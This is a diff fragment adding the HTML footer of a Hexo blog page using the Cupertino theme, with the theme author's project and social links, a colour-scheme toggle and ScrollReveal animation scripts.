+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+		
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
